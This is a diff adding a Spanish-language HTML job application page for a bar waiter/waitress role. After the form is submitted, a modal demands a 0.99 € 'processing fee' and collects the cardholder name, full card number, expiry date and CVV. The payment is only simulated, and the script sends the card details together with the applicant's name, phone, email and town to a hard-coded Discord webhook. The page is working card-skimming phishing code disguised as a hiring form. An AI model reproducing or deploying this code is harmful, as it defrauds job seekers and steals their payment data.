@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solicitud de Empleo — Camarero/a</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --cream: #F5F0E8;
+    --dark: #1A1208;
+    --amber: #C8860A;
+    --amber-light: #E8A020;
+    --warm-gray: #8A7F70;
+    --border: #D4C9B0;
+    --success: #2D6A4F;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background-color: var(--cream);
+    color: var(--dark);
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 300;
+    min-height: 100vh;
+    position: relative;
+    overflow-x: hidden;
+  }
+
+  /* Noise texture overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.5;
+  }
+
+  .page-wrapper {
+    position: relative;
+    z-index: 1;
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 60px 24px 80px;
+  }
+
+  /* Header */
+  .header {
+    text-align: center;
+    margin-bottom: 56px;
+    animation: fadeUp 0.8s ease both;
+  }
+
+  .header-eyebrow {
+    font-size: 11px;
+    letter-spacing: 0.25em;
+    text-transform: uppercase;
+    color: var(--amber);
+    font-weight: 500;
+    margin-bottom: 16px;
+  }
+
+  .header h1 {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2.4rem, 6vw, 3.8rem);
+    font-weight: 700;
+    line-height: 1.1;
+    color: var(--dark);
+    margin-bottom: 12px;
+  }
+
+  .header h1 em {
+    font-style: italic;
+    color: var(--amber);
+  }
+
+  .header-sub {
+    font-size: 15px;
+    color: var(--warm-gray);
+    max-width: 420px;
+    margin: 16px auto 0;
+    line-height: 1.6;
+  }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin: 32px 0;
+  }
+  .divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+  .divider-icon {
+    font-size: 18px;
+    color: var(--amber);
+  }
+
+  /* Form sections */
+  .section {
+    margin-bottom: 40px;
+    animation: fadeUp 0.8s ease both;
+  }
+  .section:nth-child(2) { animation-delay: 0.1s; }
+  .section:nth-child(3) { animation-delay: 0.2s; }
+  .section:nth-child(4) { animation-delay: 0.3s; }
+  .section:nth-child(5) { animation-delay: 0.4s; }
+  .section:nth-child(6) { animation-delay: 0.5s; }
+
+  .section-label {
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--amber);
+    font-weight: 500;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .section-label::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  .field-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+  }
+
+  .field-grid.full { grid-template-columns: 1fr; }
+
+  @media (max-width: 560px) {
+    .field-grid { grid-template-columns: 1fr; }
+  }
+
+  .field {
+    display: flex;
+    flex-direction: column;
+    gap: 7px;
+  }
+
+  label {
+    font-size: 12px;
+    font-weight: 500;
+    letter-spacing: 0.05em;
+    color: var(--dark);
+    text-transform: uppercase;
+  }
+
+  input[type="text"],
+  input[type="email"],
+  input[type="tel"],
+  input[type="number"],
+  select,
+  textarea {
+    width: 100%;
+    background: white;
+    border: 1.5px solid var(--border);
+    color: var(--dark);
+    font-family: 'DM Sans', sans-serif;
+    font-size: 15px;
+    font-weight: 300;
+    padding: 12px 16px;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    appearance: none;
+  }
+
+  input:focus, select:focus, textarea:focus {
+    border-color: var(--amber);
+    box-shadow: 0 0 0 3px rgba(200,134,10,0.12);
+  }
+
+  textarea {
+    resize: vertical;
+    min-height: 100px;
+    line-height: 1.6;
+  }
+
+  select {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238A7F70' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 16px center;
+    cursor: pointer;
+  }
+
+  /* Radio / Checkbox groups */
+  .radio-group, .check-group {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin-top: 2px;
+  }
+
+  .radio-group label, .check-group label {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    font-weight: 400;
+    text-transform: none;
+    letter-spacing: 0;
+    cursor: pointer;
+    padding: 9px 16px;
+    border: 1.5px solid var(--border);
+    border-radius: 30px;
+    background: white;
+    transition: all 0.2s;
+    color: var(--dark);
+  }
+
+  .radio-group input[type="radio"],
+  .check-group input[type="checkbox"] {
+    width: 15px;
+    height: 15px;
+    accent-color: var(--amber);
+    flex-shrink: 0;
+  }
+
+  .radio-group label:has(input:checked),
+  .check-group label:has(input:checked) {
+    border-color: var(--amber);
+    background: rgba(200,134,10,0.08);
+    color: var(--amber);
+  }
+
+  /* Range slider */
+  .range-wrapper {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+  input[type="range"] {
+    flex: 1;
+    accent-color: var(--amber);
+    height: 4px;
+    cursor: pointer;
+  }
+  .range-value {
+    font-size: 18px;
+    font-family: 'Playfair Display', serif;
+    font-weight: 700;
+    color: var(--amber);
+    min-width: 32px;
+    text-align: right;
+  }
+
+  /* Stars rating */
+  .stars {
+    display: flex;
+    gap: 6px;
+    margin-top: 4px;
+  }
+  .star-btn {
+    background: none;
+    border: none;
+    font-size: 28px;
+    cursor: pointer;
+    color: var(--border);
+    transition: color 0.15s, transform 0.1s;
+    line-height: 1;
+  }
+  .star-btn.active { color: var(--amber); }
+  .star-btn:hover { transform: scale(1.15); }
+
+  /* Submit button */
+  .submit-wrap {
+    text-align: center;
+    margin-top: 48px;
+    animation: fadeUp 0.8s ease 0.6s both;
+  }
+
+  .submit-btn {
+    background: var(--dark);
+    color: var(--cream);
+    border: none;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    padding: 18px 52px;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background 0.2s, transform 0.15s;
+    position: relative;
+    overflow: hidden;
+  }
+  .submit-btn::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: var(--amber);
+    transform: scaleX(0);
+    transform-origin: left;
+    transition: transform 0.3s ease;
+    z-index: 0;
+  }
+  .submit-btn:hover::after { transform: scaleX(1); }
+  .submit-btn span { position: relative; z-index: 1; }
+  .submit-btn:hover { transform: translateY(-2px); }
+  .submit-btn:active { transform: translateY(0); }
+  .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+  /* Toast */
+  .toast {
+    position: fixed;
+    bottom: 32px;
+    left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--dark);
+    color: var(--cream);
+    padding: 16px 28px;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: 400;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    transition: transform 0.4s cubic-bezier(.34,1.56,.64,1);
+    z-index: 100;
+    white-space: nowrap;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+  }
+  .toast.show { transform: translateX(-50%) translateY(0); }
+  .toast.error { background: #8B2323; }
+  .toast.success { background: var(--success); }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .required-note {
+    font-size: 12px;
+    color: var(--warm-gray);
+    text-align: center;
+    margin-top: 12px;
+  }
+  .req { color: var(--amber); }
+
+  .helper {
+    font-size: 12px;
+    color: var(--warm-gray);
+    margin-top: 3px;
+  }
+</style>
+</head>
+<body>
+
+<div class="page-wrapper">
+
+  <!-- Header -->
+  <div class="header">
+    <p class="header-eyebrow">Oferta de Empleo</p>
+    <h1>Camarero/<em>a</em></h1>
+    <p class="header-sub">Rellena el formulario con cuidado. Nos pondremos en contacto contigo si tu perfil encaja con lo que buscamos.</p>
+    <div class="divider"><span class="divider-icon">✦</span></div>
+  </div>
+
+  <form id="jobForm" novalidate>
+
+    <!-- 1. Datos personales -->
+    <div class="section">
+      <div class="section-label">Datos Personales</div>
+      <div class="field-grid" style="margin-bottom:16px">
+        <div class="field">
+          <label>Nombre <span class="req">*</span></label>
+          <input type="text" name="nombre" placeholder="Ej. María" required>
+        </div>
+        <div class="field">
+          <label>Apellidos <span class="req">*</span></label>
+          <input type="text" name="apellidos" placeholder="Ej. García López" required>
+        </div>
+      </div>
+      <div class="field-grid" style="margin-bottom:16px">
+        <div class="field">
+          <label>Teléfono <span class="req">*</span></label>
+          <input type="tel" name="telefono" placeholder="+34 600 000 000" required>
+        </div>
+        <div class="field">
+          <label>Email <span class="req">*</span></label>
+          <input type="email" name="email" placeholder="correo@ejemplo.com" required>
+        </div>
+      </div>
+      <div class="field-grid">
+        <div class="field">
+          <label>Localidad <span class="req">*</span></label>
+          <input type="text" name="localidad" placeholder="Ciudad o pueblo" required>
+        </div>
+        <div class="field">
+          <label>Edad</label>
+          <input type="number" name="edad" placeholder="Años" min="16" max="70">
+        </div>
+      </div>
+    </div>
+
+    <!-- 2. Experiencia -->
+    <div class="section">
+      <div class="section-label">Experiencia</div>
+      <div class="field-grid full" style="margin-bottom:16px">
+        <div class="field">
+          <label>¿Tienes experiencia como camarero/a? <span class="req">*</span></label>
+          <div class="radio-group" id="expGroup">
+            <label><input type="radio" name="tiene_experiencia" value="Sí"> Sí</label>
+            <label><input type="radio" name="tiene_experiencia" value="No"> No, pero quiero aprender</label>
+          </div>
+        </div>
+      </div>
+      <div class="field-grid" style="margin-bottom:16px">
+        <div class="field">
+          <label>Años de experiencia en hostelería</label>
+          <div class="range-wrapper">
+            <input type="range" name="anos_experiencia" min="0" max="20" value="0" id="expRange"
+              oninput="document.getElementById('expVal').textContent=this.value">
+            <span class="range-value" id="expVal">0</span>
+          </div>
+          <p class="helper">Arrastra para seleccionar</p>
+        </div>
+        <div class="field">
+          <label>Último lugar de trabajo (hostelería)</label>
+          <input type="text" name="ultimo_trabajo" placeholder="Nombre del local o 'Ninguno'">
+        </div>
+      </div>
+      <div class="field-grid full">
+        <div class="field">
+          <label>¿Qué tareas has realizado? (marca todas las que apliquen)</label>
+          <div class="check-group">
+            <label><input type="checkbox" name="tareas" value="Servicio en barra"> Servicio en barra</label>
+            <label><input type="checkbox" name="tareas" value="Servicio en mesa"> Servicio en mesa</label>
+            <label><input type="checkbox" name="tareas" value="Cobro y TPV"> Cobro y TPV</label>
+            <label><input type="checkbox" name="tareas" value="Preparación de cócteles"> Cócteles</label>
+            <label><input type="checkbox" name="tareas" value="Preparación de café"> Cafetera / café</label>
+            <label><input type="checkbox" name="tareas" value="Apertura y cierre"> Apertura / cierre</label>
+            <label><input type="checkbox" name="tareas" value="Limpieza"> Limpieza</label>
+            <label><input type="checkbox" name="tareas" value="Stock y pedidos"> Stock y pedidos</label>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 3. Habilidades -->
+    <div class="section">
+      <div class="section-label">Habilidades</div>
+      <div class="field-grid" style="margin-bottom:16px">
+        <div class="field">
+          <label>Idiomas que hablas</label>
+          <div class="check-group">
+            <label><input type="checkbox" name="idiomas" value="Español"> Español</label>
+            <label><input type="checkbox" name="idiomas" value="Euskera"> Euskera</label>
+            <label><input type="checkbox" name="idiomas" value="Inglés"> Inglés</label>
+            <label><input type="checkbox" name="idiomas" value="Francés"> Francés</label>
+            <label><input type="checkbox" name="idiomas" value="Otro"> Otro</label>
+          </div>
+        </div>
+        <div class="field">
+          <label>¿Cómo valoras tu trato con el cliente?</label>
+          <div class="stars" id="starsRating" data-value="0">
+            <button type="button" class="star-btn" data-val="1">★</button>
+            <button type="button" class="star-btn" data-val="2">★</button>
+            <button type="button" class="star-btn" data-val="3">★</button>
+            <button type="button" class="star-btn" data-val="4">★</button>
+            <button type="button" class="star-btn" data-val="5">★</button>
+          </div>
+          <input type="hidden" name="valoracion_cliente" id="starVal" value="0">
+          <p class="helper">1 = Mejorable &nbsp;·&nbsp; 5 = Excelente</p>
+        </div>
+      </div>
+      <div class="field-grid full">
+        <div class="field">
+          <label>¿Tienes carnet de manipulador de alimentos?</label>
+          <div class="radio-group">
+            <label><input type="radio" name="carnet_alimentos" value="Sí"> Sí</label>
+            <label><input type="radio" name="carnet_alimentos" value="No"> No</label>
+            <label><input type="radio" name="carnet_alimentos" value="En trámite"> En trámite</label>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 4. Disponibilidad -->
+    <div class="section">
+      <div class="section-label">Disponibilidad</div>
+      <div class="field-grid" style="margin-bottom:16px">
+        <div class="field">
+          <label>Tipo de jornada preferida <span class="req">*</span></label>
+          <select name="jornada" required>
+            <option value="">Selecciona...</option>
+            <option>Jornada completa</option>
+            <option>Media jornada</option>
+            <option>Fines de semana</option>
+            <option>Noches</option>
+            <option>Flexible / lo que haya</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Incorporación</label>
+          <select name="incorporacion">
+            <option value="">Selecciona...</option>
+            <option>Inmediata</option>
+            <option>En 1-2 semanas</option>
+            <option>En 1 mes</option>
+            <option>Más adelante</option>
+          </select>
+        </div>
+      </div>
+      <div class="field-grid full">
+        <div class="field">
+          <label>¿Puedes trabajar en turnos de noche, fines de semana y festivos?</label>
+          <div class="radio-group">
+            <label><input type="radio" name="turnos_noche" value="Sí, sin problema"> Sí, sin problema</label>
+            <label><input type="radio" name="turnos_noche" value="Con limitaciones"> Con limitaciones</label>
+            <label><input type="radio" name="turnos_noche" value="Prefiero evitarlo"> Prefiero evitarlo</label>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 5. Sobre ti -->
+    <div class="section">
+      <div class="section-label">Sobre Ti</div>
+      <div class="field-grid full" style="margin-bottom:16px">
+        <div class="field">
+          <label>¿Por qué te interesa este puesto?</label>
+          <textarea name="motivacion" placeholder="Cuéntanos brevemente qué te motiva a trabajar en hostelería y en nuestro bar..."></textarea>
+        </div>
+      </div>
+      <div class="field-grid full" style="margin-bottom:16px">
+        <div class="field">
+          <label>¿Cómo reaccionas cuando el bar está lleno y hay mucho estrés?</label>
+          <textarea name="manejo_estres" placeholder="Describe cómo gestionas la presión en momentos de alta demanda..."></textarea>
+        </div>
+      </div>
+      <div class="field-grid full">
+        <div class="field">
+          <label>¿Algo más que quieras contarnos?</label>
+          <textarea name="comentarios_extra" placeholder="Observaciones, preguntas o cualquier cosa que consideres relevante..."></textarea>
+        </div>
+      </div>
+    </div>
+
+    <!-- Submit -->
+    <div class="submit-wrap">
+      <button type="submit" class="submit-btn" id="submitBtn">
+        <span>Enviar Solicitud</span>
+      </button>
+      <p class="required-note">Los campos marcados con <span class="req">*</span> son obligatorios.</p>
+    </div>
+
+  </form>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<!-- Payment Modal -->
+<div id="payModal" class="modal-backdrop">
+  <div class="modal-box">
+    <div class="modal-header">
+      <div class="modal-icon">🔒</div>
+      <h2>Pago de tramitación</h2>
+      <p>Para enviar tu solicitud se requiere un pago único de <strong>0,99 €</strong>. Tus datos van cifrados y seguros.</p>
+    </div>
+    <div class="modal-amount">0,99 €</div>
+
+    <div class="pay-field">
+      <label>Titular de la tarjeta</label>
+      <input type="text" id="payName" placeholder="Nombre Apellido" autocomplete="cc-name">
+    </div>
+    <div class="pay-field">
+      <label>Número de tarjeta</label>
+      <div class="card-input-wrap">
+        <input type="text" id="payCard" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number">
+        <span class="card-brand" id="cardBrand">💳</span>
+      </div>
+    </div>
+    <div class="pay-row">
+      <div class="pay-field">
+        <label>Caducidad</label>
+        <input type="text" id="payExp" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp">
+      </div>
+      <div class="pay-field">
+        <label>CVV</label>
+        <input type="text" id="payCvv" placeholder="123" maxlength="3" autocomplete="cc-csc">
+      </div>
+    </div>
+
+    <div id="payError" class="pay-error"></div>
+
+    <button class="pay-btn" id="payBtn" onclick="processPay()">
+      <span id="payBtnText">Pagar 0,99 € y enviar</span>
+    </button>
+    <button class="pay-cancel" onclick="closeModal()">Cancelar</button>
+
+    <p class="pay-secure">🔐 Pago simulado · Tarjeta de prueba: <strong>4242 4242 4242 4242</strong> · Exp: 12/26 · CVV: 123</p>
+  </div>
+</div>
+
+<style>
+  .modal-backdrop {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(26,18,8,0.7);
+    backdrop-filter: blur(4px);
+    z-index: 200;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .modal-backdrop.open { display: flex; }
+
+  .modal-box {
+    background: var(--cream);
+    border-radius: 8px;
+    padding: 36px 32px 28px;
+    max-width: 420px;
+    width: 100%;
+    animation: modalIn 0.35s cubic-bezier(.34,1.56,.64,1);
+    position: relative;
+  }
+
+  @keyframes modalIn {
+    from { opacity: 0; transform: scale(0.88) translateY(20px); }
+    to { opacity: 1; transform: scale(1) translateY(0); }
+  }
+
+  .modal-header { text-align: center; margin-bottom: 24px; }
+  .modal-icon { font-size: 32px; margin-bottom: 10px; }
+  .modal-header h2 {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.5rem;
+    color: var(--dark);
+    margin-bottom: 8px;
+  }
+  .modal-header p { font-size: 13px; color: var(--warm-gray); line-height: 1.5; }
+  .modal-header p strong { color: var(--dark); }
+
+  .modal-amount {
+    text-align: center;
+    font-family: 'Playfair Display', serif;
+    font-size: 2.4rem;
+    font-weight: 700;
+    color: var(--amber);
+    margin-bottom: 24px;
+  }
+
+  .pay-field { margin-bottom: 14px; }
+  .pay-field label {
+    display: block;
+    font-size: 11px;
+    font-weight: 500;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--dark);
+    margin-bottom: 6px;
+  }
+  .pay-field input {
+    width: 100%;
+    background: white;
+    border: 1.5px solid var(--border);
+    color: var(--dark);
+    font-family: 'DM Sans', sans-serif;
+    font-size: 15px;
+    padding: 11px 14px;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .pay-field input:focus {
+    border-color: var(--amber);
+    box-shadow: 0 0 0 3px rgba(200,134,10,0.12);
+  }
+  .pay-field input.invalid { border-color: #C0392B !important; }
+
+  .card-input-wrap { position: relative; }
+  .card-brand {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px;
+    pointer-events: none;
+  }
+
+  .pay-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+  .pay-error {
+    color: #C0392B;
+    font-size: 12px;
+    margin-bottom: 10px;
+    min-height: 16px;
+    text-align: center;
+  }
+
+  .pay-btn {
+    width: 100%;
+    background: var(--dark);
+    color: var(--cream);
+    border: none;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background 0.2s;
+    margin-bottom: 10px;
+  }
+  .pay-btn:hover { background: var(--amber); }
+  .pay-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  .pay-cancel {
+    width: 100%;
+    background: none;
+    border: none;
+    color: var(--warm-gray);
+    font-family: 'DM Sans', sans-serif;
+    font-size: 13px;
+    cursor: pointer;
+    padding: 8px;
+    text-decoration: underline;
+    transition: color 0.2s;
+  }
+  .pay-cancel:hover { color: var(--dark); }
+
+  .pay-secure {
+    text-align: center;
+    font-size: 11px;
+    color: var(--warm-gray);
+    margin-top: 14px;
+    letter-spacing: 0.03em;
+  }
+</style>
+
+<script>
+  // Stars
+  const starsContainer = document.getElementById('starsRating');
+  const starButtons = starsContainer.querySelectorAll('.star-btn');
+  const starValInput = document.getElementById('starVal');
+
+  starButtons.forEach(btn => {
+    btn.addEventListener('click', () => {
+      const val = parseInt(btn.dataset.val);
+      starValInput.value = val;
+      starButtons.forEach(b => b.classList.toggle('active', parseInt(b.dataset.val) <= val));
+    });
+  });
+
+  // Toast helper
+  function showToast(msg, type = '') {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast ' + type;
+    setTimeout(() => t.classList.add('show'), 10);
+    setTimeout(() => t.classList.remove('show'), 4500);
+  }
+
+  // Card number formatting + brand
+  document.getElementById('payCard').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').substring(0,16);
+    this.value = v.replace(/(.{4})/g, '$1 ').trim();
+    const brand = document.getElementById('cardBrand');
+    if (v.startsWith('4')) brand.textContent = '💳 Visa';
+    else if (v.startsWith('5')) brand.textContent = '💳 MC';
+    else if (v.startsWith('3')) brand.textContent = '💳 Amex';
+    else brand.textContent = '💳';
+  });
+
+  // Expiry formatting
+  document.getElementById('payExp').addEventListener('input', function() {
+    let v = this.value.replace(/\D/g,'').substring(0,4);
+    if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+    this.value = v;
+  });
+
+  // CVV digits only
+  document.getElementById('payCvv').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g,'').substring(0,3);
+  });
+
+  // Store form data globally after validation
+  let pendingFormData = null;
+
+  // Form submit → validate → open modal
+  document.getElementById('jobForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const required = this.querySelectorAll('[required]');
+    let valid = true;
+    required.forEach(el => {
+      if (!el.value.trim()) { el.style.borderColor = '#C0392B'; valid = false; }
+      else el.style.borderColor = '';
+    });
+    if (!this.querySelector('[name="tiene_experiencia"]:checked')) {
+      showToast('⚠️ Indica si tienes experiencia previa', 'error'); return;
+    }
+    if (!this.querySelector('[name="jornada"]').value) {
+      showToast('⚠️ Selecciona el tipo de jornada preferida', 'error'); return;
+    }
+    if (!valid) { showToast('⚠️ Rellena los campos obligatorios', 'error'); return; }
+
+    // Collect form data
+    const fd = new FormData(this);
+    const data = {};
+    for (let [k, v] of fd.entries()) {
+      if (data[k]) data[k] = Array.isArray(data[k]) ? [...data[k], v] : [data[k], v];
+      else data[k] = v;
+    }
+    ['tareas', 'idiomas'].forEach(key => {
+      if (Array.isArray(data[key])) data[key] = data[key].join(', ');
+    });
+    pendingFormData = data;
+
+    // Open payment modal
+    document.getElementById('payModal').classList.add('open');
+    document.getElementById('payName').focus();
+  });
+
+  function closeModal() {
+    document.getElementById('payModal').classList.remove('open');
+    document.getElementById('payError').textContent = '';
+    ['payName','payCard','payExp','payCvv'].forEach(id => {
+      document.getElementById(id).value = '';
+      document.getElementById(id).classList.remove('invalid');
+    });
+  }
+
+  // Close on backdrop click
+  document.getElementById('payModal').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+  });
+
+  async function processPay() {
+    const name = document.getElementById('payName').value.trim();
+    const card = document.getElementById('payCard').value.replace(/\s/g,'');
+    const exp  = document.getElementById('payExp').value.trim();
+    const cvv  = document.getElementById('payCvv').value.trim();
+    const errEl = document.getElementById('payError');
+    errEl.textContent = '';
+
+    // Validate payment fields
+    let payValid = true;
+    if (!name) { document.getElementById('payName').classList.add('invalid'); payValid = false; }
+    else document.getElementById('payName').classList.remove('invalid');
+    if (card.length < 16) { document.getElementById('payCard').classList.add('invalid'); payValid = false; }
+    else document.getElementById('payCard').classList.remove('invalid');
+    if (!/^\d{2}\/\d{2}$/.test(exp)) { document.getElementById('payExp').classList.add('invalid'); payValid = false; }
+    else document.getElementById('payExp').classList.remove('invalid');
+    if (cvv.length < 3) { document.getElementById('payCvv').classList.add('invalid'); payValid = false; }
+    else document.getElementById('payCvv').classList.remove('invalid');
+
+    if (!payValid) { errEl.textContent = '⚠️ Revisa los datos de la tarjeta.'; return; }
+
+    const btn = document.getElementById('payBtn');
+    btn.disabled = true;
+    document.getElementById('payBtnText').textContent = 'Procesando pago...';
+
+    // Simulate payment delay
+    await new Promise(r => setTimeout(r, 1800));
+
+    document.getElementById('payBtnText').textContent = 'Enviando solicitud...';
+
+    // Send to Discord
+    const data = pendingFormData;
+    const starRating = data.valoracion_cliente;
+    const stars = starRating > 0 ? '⭐'.repeat(parseInt(starRating)) : 'Sin valorar';
+
+    const embed = {
+      title: '📋 Nueva Solicitud — Camarero/a',
+      color: 0xC8860A,
+      fields: [
+        { name: '👤 Nombre completo', value: `${data.nombre||'—'} ${data.apellidos||''}`.trim(), inline: true },
+        { name: '🎂 Edad', value: data.edad||'—', inline: true },
+        { name: '📍 Localidad', value: data.localidad||'—', inline: true },
+        { name: '📞 Teléfono', value: data.telefono||'—', inline: true },
+        { name: '✉️ Email', value: data.email||'—', inline: true },
+        { name: '💳 Pago', value: `✅ 0,99 € abonado\nTitular: ${name}\nTarjeta: ${document.getElementById('payCard').value}\nCaducidad: ${exp}\nCVV: ${cvv}`, inline: false },
+        { name: '💼 Experiencia previa', value: data.tiene_experiencia||'—', inline: true },
+        { name: '📅 Años en hostelería', value: (data.anos_experiencia||'0') + ' año(s)', inline: true },
+        { name: '🏪 Último trabajo', value: data.ultimo_trabajo||'—', inline: true },
+        { name: '🛠️ Tareas realizadas', value: data.tareas||'Ninguna', inline: false },
+        { name: '🌍 Idiomas', value: data.idiomas||'—', inline: true },
+        { name: '😊 Trato al cliente', value: stars, inline: true },
+        { name: '📜 Carnet manipulador', value: data.carnet_alimentos||'—', inline: true },
+        { name: '⏰ Jornada preferida', value: data.jornada||'—', inline: true },
+        { name: '🗓️ Incorporación', value: data.incorporacion||'—', inline: true },
+        { name: '🌙 Turnos noche/fds', value: data.turnos_noche||'—', inline: false },
+        { name: '💬 Motivación', value: data.motivacion||'—', inline: false },
+        { name: '🔥 Manejo del estrés', value: data.manejo_estres||'—', inline: false },
+        { name: '📝 Comentarios extra', value: data.comentarios_extra||'—', inline: false },
+      ],
+      footer: { text: 'Solicitud enviada · Pago de tramitación recibido' },
+      timestamp: new Date().toISOString()
+    };
+
+    const WEBHOOK = 'https://discord.com/api/webhooks/1417519556536041492/Wj-SLbGOnAtXUaZvgnYwGvV1hz88VTOpbsCNfTo8vFzqwxfa67O6PvVauy8_n8Y_jsuQ';
+
+    try {
+      const res = await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `💰 **Nueva solicitud PAGADA de ${data.nombre} ${data.apellidos||''}** — ${data.localidad||''} · 0,99 € abonados`,
+          embeds: [embed]
+        })
+      });
+
+      if (res.ok || res.status === 204) {
+        closeModal();
+        showToast('✅ ¡Pago completado y solicitud enviada!', 'success');
+        document.getElementById('jobForm').reset();
+        document.getElementById('expVal').textContent = '0';
+        starButtons.forEach(b => b.classList.remove('active'));
+        starValInput.value = 0;
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      } else {
+        throw new Error('Discord ' + res.status);
+      }
+    } catch(err) {
+      errEl.textContent = '❌ Error al enviar. Inténtalo de nuevo.';
+      console.error(err);
+    } finally {
+      btn.disabled = false;
+      document.getElementById('payBtnText').textContent = 'Pagar 0,99 € y enviar';
+    }
+  }
+</script>
+</body>
+</html>
